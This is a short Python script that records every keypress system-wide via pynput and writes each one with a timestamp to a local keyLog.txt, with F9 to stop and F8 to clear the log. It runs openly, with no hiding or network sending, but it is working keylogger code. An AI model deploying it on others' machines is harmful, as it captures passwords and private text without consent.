from pynput.keyboard import Key, Listener
import logging
import sys
import os

currently_active = True
# log_dir = r"C:/Users/Q1045698/Documents/python_keystrokes/"
filename = os.getcwd() + "\keyLog.txt"
logging.basicConfig(filename=filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    if(str(key) == 'Key.f9'):
        currently_active = False
        print("Logged to: " + filename)
        sys.exit()
    elif(str(key) == 'Key.f8'):
        open(filename, 'w').close()
        print("File cleared!")
    else:
        logging.info(str(key))


with Listener(on_press=on_press) as listener:
    # print(currently_active)
    if(currently_active == True):
        listener.join()